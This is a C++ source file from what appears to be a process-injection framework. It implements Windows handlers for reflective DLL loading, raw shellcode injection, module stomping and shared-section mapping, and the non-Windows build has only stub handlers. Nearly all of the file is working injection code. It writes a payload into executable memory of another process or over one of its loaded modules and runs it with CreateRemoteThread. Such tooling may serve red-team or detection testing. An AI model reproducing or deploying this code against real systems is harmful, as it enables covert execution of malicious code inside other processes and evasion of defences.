#include "handler_payloads.h"
#include "module_utils.h"
#include "ntdll_utils.h"
#include "pe_utils.h"
#include "payload_utils.h"
#include "process_utils.h"
#include "remote_memory.h"

#include <cstring>
#include <optional>
#include <string>
#include <vector>

#ifndef _WIN32
dispatch_outcome handle_manual_map(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_shellcode(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_reflective_dll(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_module_stomping(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_shared_section_map(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

#else
namespace
{
    const char* resolve_payload_path(const rw_injection_request* req, const parsed_params& params)
    {
        if (const auto override_path = params.get_string("payloadPath"))
        {
            return override_path->c_str();
        }
        return req ? req->payload_path : nullptr;
    }

    bool parse_entry_offset(const parsed_params& params, size_t payload_size, size_t& entry_offset, dispatch_outcome& failure)
    {
        entry_offset = 0;
        if (const auto offset_value = params.get_int("entryOffset"))
        {
            if (*offset_value < 0)
            {
                failure = { false, "TECHNIQUE_PARAM_INVALID", "entryOffset must be zero or greater." };
                return false;
            }

            size_t offset = static_cast<size_t>(*offset_value);
            if (offset >= payload_size)
            {
                failure = { false, "TECHNIQUE_PARAM_INVALID", "entryOffset must be within payload bounds." };
                return false;
            }

            entry_offset = offset;
        }

        return true;
    }

    dispatch_outcome run_reflective_load(const rw_injection_request* req, const parsed_params& params, const char* export_param, const char* default_export)
    {
        dispatch_outcome failure{};
        HANDLE process = open_process_for_injection(req,
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            failure);
        if (!process)
        {
            return failure;
        }

        const char* payload_path = resolve_payload_path(req, params);
        if (!payload_path || payload_path[0] == '\0')
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_PATH_REQUIRED", "Payload path is required." };
        }

        if (!payload_exists(payload_path))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_NOT_FOUND", "Payload was not found." };
        }

        std::vector<unsigned char> payload;
        if (!read_payload_file(payload_path, payload))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_READ_FAILED", "Failed to read payload file." };
        }

        std::string export_name = default_export;
        if (const auto override_name = params.get_string(export_param))
        {
            if (override_name->empty())
            {
                if (process != ::GetCurrentProcess())
                {
                    ::CloseHandle(process);
                }
                return { false, "TECHNIQUE_PARAM_INVALID", "Export name must be non-empty." };
            }
            export_name = *override_name;
        }

        uint32_t export_offset = 0;
        if (!find_export_offset(payload, export_name, export_offset))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "REFLECTIVE_EXPORT_NOT_FOUND", "Reflective loader export was not found." };
        }

        bool is_self = process == ::GetCurrentProcess();
        void* remote_base = alloc_target_memory(process, payload.size(), PAGE_EXECUTE_READWRITE, is_self);
        if (!remote_base)
        {
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for payload." };
        }

        if (!write_target_memory(process, remote_base, payload.data(), payload.size(), is_self))
        {
            free_target_memory(process, remote_base, is_self);
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_WRITE_FAILED", "Failed to write payload to target process." };
        }

        ::FlushInstructionCache(process, remote_base, payload.size());

        auto start_address = reinterpret_cast<unsigned char*>(remote_base) + export_offset;

        HANDLE thread = nullptr;
        if (is_self)
        {
            thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), remote_base, 0, nullptr);
        }
        else
        {
            thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), remote_base, 0, nullptr);
        }

        if (!thread)
        {
            free_target_memory(process, remote_base, is_self);
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "THREAD_CREATE_FAILED", "Failed to start reflective loader thread." };
        }

        ::WaitForSingleObject(thread, INFINITE);
        ::CloseHandle(thread);

        if (!is_self)
        {
            ::CloseHandle(process);
        }

        return { true, nullptr, nullptr };
    }

}

dispatch_outcome handle_manual_map(const rw_injection_request* req, const parsed_params& params)
{
    return run_reflective_load(req, params, "entryPoint", "ReflectiveLoader");
}

dispatch_outcome handle_shellcode(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Shellcode payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_READ_FAILED", "Failed to read shellcode payload." };
    }

    LPVOID remote_buffer = nullptr;
    SIZE_T payload_size = payload.size();
    size_t entry_offset = 0;
    if (!parse_entry_offset(params, payload_size, entry_offset, failure))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return failure;
    }
    if (process == ::GetCurrentProcess())
    {
        remote_buffer = ::VirtualAlloc(nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    else
    {
        remote_buffer = ::VirtualAllocEx(process, nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_buffer)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for shellcode." };
    }

    BOOL write_ok = FALSE;
    if (process == ::GetCurrentProcess())
    {
        std::memcpy(remote_buffer, payload.data(), payload_size);
        write_ok = TRUE;
    }
    else
    {
        write_ok = ::WriteProcessMemory(process, remote_buffer, payload.data(), payload_size, nullptr);
    }

    if (!write_ok)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        }
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write shellcode to target process." };
    }

    ::FlushInstructionCache(process, remote_buffer, payload_size);

    auto start_address = reinterpret_cast<unsigned char*>(remote_buffer) + entry_offset;
    HANDLE thread = nullptr;
    if (process == ::GetCurrentProcess())
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), nullptr, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), nullptr, 0, nullptr);
    }

    if (!thread)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        }
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start shellcode thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);

    if (process == ::GetCurrentProcess())
    {
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }
    else
    {
        ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_reflective_dll(const rw_injection_request* req, const parsed_params& params)
{
    return run_reflective_load(req, params, "exportName", "ReflectiveLoader");
}

dispatch_outcome handle_module_stomping(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_path || payload_path[0] == '\0')
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_PATH_REQUIRED", "Payload path is required." };
    }

    if (!payload_exists(payload_path))
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_NOT_FOUND", "ModuleStomping payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_READ_FAILED", "Failed to read module stomping payload." };
    }

    if (process == ::GetCurrentProcess())
    {
        return { false, "TARGET_SELF_UNSUPPORTED", "ModuleStomping is not supported against the current process." };
    }

    std::optional<std::string> module_name;
    if (const auto name = params.get_string("moduleName"))
    {
        if (name->empty())
        {
            ::CloseHandle(process);
            return { false, "TECHNIQUE_PARAM_INVALID", "moduleName must be non-empty." };
        }
        module_name = *name;
    }

    MODULEENTRY32 module{};
    DWORD pid = ::GetProcessId(process);
    if (!find_module_entry(pid, module_name, module))
    {
        ::CloseHandle(process);
        return { false, "MODULE_NOT_FOUND", "Target module was not found." };
    }

    if (payload.size() > module.modBaseSize)
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_TOO_LARGE", "Payload is larger than target module." };
    }

    size_t entry_offset = 0;
    if (!parse_entry_offset(params, payload.size(), entry_offset, failure))
    {
        ::CloseHandle(process);
        return failure;
    }

    DWORD old_protect = 0;
    if (!::VirtualProtectEx(process, module.modBaseAddr, payload.size(), PAGE_EXECUTE_READWRITE, &old_protect))
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_PROTECT_FAILED", "Failed to change module memory protection." };
    }

    if (!::WriteProcessMemory(process, module.modBaseAddr, payload.data(), payload.size(), nullptr))
    {
        DWORD ignored = 0;
        ::VirtualProtectEx(process, module.modBaseAddr, payload.size(), old_protect, &ignored);
        ::CloseHandle(process);
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to stomp module memory." };
    }

    ::FlushInstructionCache(process, module.modBaseAddr, payload.size());

    DWORD ignored = 0;
    ::VirtualProtectEx(process, module.modBaseAddr, payload.size(), old_protect, &ignored);

    auto start_address = reinterpret_cast<unsigned char*>(module.modBaseAddr) + entry_offset;
    HANDLE thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), nullptr, 0, nullptr);
    if (!thread)
    {
        ::CloseHandle(process);
        return { false, "THREAD_CREATE_FAILED", "Failed to start module stomping thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);
    ::CloseHandle(process);
    return { true, nullptr, nullptr };
}

dispatch_outcome handle_shared_section_map(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_path || payload_path[0] == '\0')
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_PATH_REQUIRED", "Payload path is required." };
    }

    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Shared section payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_READ_FAILED", "Failed to read shared section payload." };
    }

    std::optional<std::string> section_name;
    if (const auto name = params.get_string("sectionName"))
    {
        if (name->empty())
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "TECHNIQUE_PARAM_INVALID", "sectionName must be non-empty." };
        }
        section_name = *name;
    }

    size_t payload_size = payload.size();
    DWORD size_high = static_cast<DWORD>((payload_size >> 32) & 0xFFFFFFFF);
    DWORD size_low = static_cast<DWORD>(payload_size & 0xFFFFFFFF);
    HANDLE mapping = ::CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, size_high, size_low,
        section_name ? section_name->c_str() : nullptr);
    if (!mapping)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "SECTION_CREATE_FAILED", "Failed to create shared section." };
    }

    void* local_view = ::MapViewOfFile(mapping, FILE_MAP_READ | FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, payload_size);
    if (!local_view)
    {
        ::CloseHandle(mapping);
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "SECTION_MAP_FAILED", "Failed to map shared section locally." };
    }

    std::memcpy(local_view, payload.data(), payload_size);

    bool is_self = process == ::GetCurrentProcess();
    void* remote_view = local_view;
    NtMapViewOfSection_t map_view = nullptr;
    NtUnmapViewOfSection_t unmap_view = nullptr;

    if (!is_self)
    {
        map_view = resolve_nt_map_view_of_section();
        unmap_view = resolve_nt_unmap_view_of_section();
        if (!map_view)
        {
            ::UnmapViewOfFile(local_view);
            ::CloseHandle(mapping);
            ::CloseHandle(process);
            return { false, "SECTION_MAP_FAILED", "NtMapViewOfSection could not be resolved." };
        }

        SIZE_T view_size = payload_size;
        PVOID base_address = nullptr;
        LONG status = map_view(mapping, process, &base_address, 0, 0, nullptr, &view_size, 1, 0, PAGE_EXECUTE_READWRITE);
        if (status != 0 || !base_address)
        {
            ::UnmapViewOfFile(local_view);
            ::CloseHandle(mapping);
            ::CloseHandle(process);
            return { false, "SECTION_MAP_FAILED", "Failed to map shared section into target process." };
        }

        remote_view = base_address;
    }

    HANDLE thread = nullptr;
    if (is_self)
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_view), nullptr, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_view), nullptr, 0, nullptr);
    }

    if (!thread)
    {
        if (!is_self && unmap_view && remote_view)
        {
            unmap_view(process, remote_view);
        }
        ::UnmapViewOfFile(local_view);
        ::CloseHandle(mapping);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start shared section thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);

    if (!is_self && unmap_view && remote_view)
    {
        unmap_view(process, remote_view);
    }

    ::UnmapViewOfFile(local_view);
    ::CloseHandle(mapping);

    if (!is_self)
    {
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}
#endif
